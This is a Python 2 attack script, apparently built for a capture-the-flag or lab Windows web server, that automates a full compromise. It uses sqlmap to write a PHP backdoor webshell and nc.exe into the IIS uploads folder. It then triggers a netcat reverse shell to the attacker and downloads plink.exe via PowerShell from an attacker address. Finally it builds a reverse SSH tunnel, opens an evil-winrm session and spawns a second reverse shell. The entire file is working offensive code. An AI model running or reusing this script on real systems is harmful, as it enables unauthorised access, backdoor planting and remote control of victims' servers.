#! /bin/python2

import os
import sys
import socket
import requests
import threading
from time import sleep


class Threader(object):
    def __init__(self):
        self.attacker = 'yourip'
        self.attackerport = 443
        self.target = 'targetport'
        self.postfile = 'postfilelocation'
        self.size = 8192
        self.client = None
        self.address = None
        self.attackerusername = 'sshusernamehere'
        self.attackerpw = 'passwordhere'
        self.targetusername = 'targetuser'
        self.targetpw = 'targetpassword'
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind((self.attacker,self.attackerport))
    
    def listenThread(self):
        self.s.listen(5)
        threading.Thread(target = self.listenToClient).start()

    def listenToClient(self):
        self.size
        self.client, self.address = self.s.accept()
        print('Target connected from: %s' % str(self.address))
        while True:
            try:
                data = self.client.recv(self.size)
                if data:
                    print data
            except:
                self.client.close()
                return False

    def close(self):
        self.client.close()
        
    def sendCommand(self,cmd):
        self.client.send(cmd + '\n')
        sleep(5)

    def sendThread(self):
        threading.Thread(target = self.sendRequest).start()

    def sendRequest(self):
        url = 'http://' + self.target + '/uploads/c.php'
        param = 'cmd=nc.exe%20' + self.attacker + '%20' + str(self.attackerport) + '%20-e%20cmd.exe'
        r = requests.get(url,params=param)

    def fileuploader(self):
        os.system('sqlmap -r %s --file-write=/usr/share/webshells/php/simple-backdoor.php --file-dest=C:/inetpub/wwwroot/uploads/c.php --batch' % self.postfile)
        os.system('sqlmap -r %s --file-write=/usr/share/windows-resources/binaries/nc.exe --file-dest=C:/inetpub/wwwroot/uploads/nc.exe --batch' % self.postfile)

Thread = Threader()
#Thread.fileuploader()
Thread.listenThread()
Thread.sendThread()
sleep(5)
# Use this if you want it to be automated in a serial fashion
Thread.sendCommand('del plink.exe')
Thread.sendCommand('dir')
Thread.sendCommand('powershell -Exec Bypass -Command "wget http://10.10.15.131/plink.exe -Outfile plink.exe"')
Thread.sendCommand('plink.exe -N ' + Thread.attacker + ' -P 22 -C -R 5985:127.0.0.1:5985 -l ' + Thread.attackerusername + ' -pw ' + Thread.attackerpw)
Thread.sendCommand('y')
#os.system('gem install evil-winrm')
print('Starting evil-winrm session')
os.system('screen -S winrm -d -m evil-winrm -i 127.0.0.1 -u ' + Thread.targetusername + ' -p ' + Thread.targetpw)
sleep(5)
print('Changing directory')
os.system("screen -S winrm -p 0 -X stuff 'cd C:/inetpub/wwwroot/uploads/^M'")
sleep(5)
print('Closing old socket')
Thread.close()
print('Starting new listener')
Thread.listenThread()
sleep(5)
print('Creating new shell')
os.system("screen -S winrm -p 0 -X stuff 'cmd.exe /c nc.exe " + Thread.attacker + " " + str(Thread.attackerport) + " -e cmd.exe^M'")
print('Interactive shell incoming')
while True:
    Thread.sendCommand(raw_input())
